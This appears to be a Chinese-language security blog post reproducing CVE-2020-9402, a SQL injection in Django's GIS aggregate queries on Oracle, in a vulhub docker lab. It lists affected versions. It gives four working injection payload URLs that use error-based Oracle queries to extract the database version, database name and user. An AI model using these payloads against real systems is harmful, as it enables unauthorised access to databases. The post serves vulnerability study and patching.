---
layout: post
title: Django GIS SQL注入漏洞
tags: Django
categories: CVE-2020-9402
---

# Django GIS SQL注入漏洞（CVE-2020-9402）

## 漏洞描述

该漏洞需要开发者使用了GIS中聚合查询的功能，用户在oracle的数据库且可控tolerance查询时的键名，在其位置注入SQL语句。

GIS查询API是一个地理位置的查询API，提供用户存储精确GPS的位置的数据模块，属于一个空间数据库。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。

环境启动后，访问`http://your-ip:8000/`可看到如下页面

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2020-9402/15947916917489.jpg)

1.访问`http://your-ip:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1`，使用GET请求构造q参数，`q=20) = 1 OR (select utl_inaddr.get_host_name
((SELECT version FROM v$instance)) from dual) is null OR (1+1`获取数据库版本：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2020-9402/15947919823375.jpg)

访问`http://your-ip:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20name%20FROM%20v%24database))%20from%20dual)%20is%20null%20%20OR%20(1%2B1`查看数据库名：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2020-9402/15947928940011.jpg)

2.访问`http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--`使用GET请求构造q参数，`q=0.05))) FROM "VULN_COLLECTION2" where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --`查看用户名：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2020-9402/15947925272312.jpg)

访问`http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((select%20name%20from%20v$database))%20from%20dual)%20is%20not%20null%20%20--`查看数据库名：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2020-9402/15947927439763.jpg)

## 受影响版本

Django 1.11 < 1.11.29
Django 2.2 < 2.2.11
Django 3.0 < 3.0.4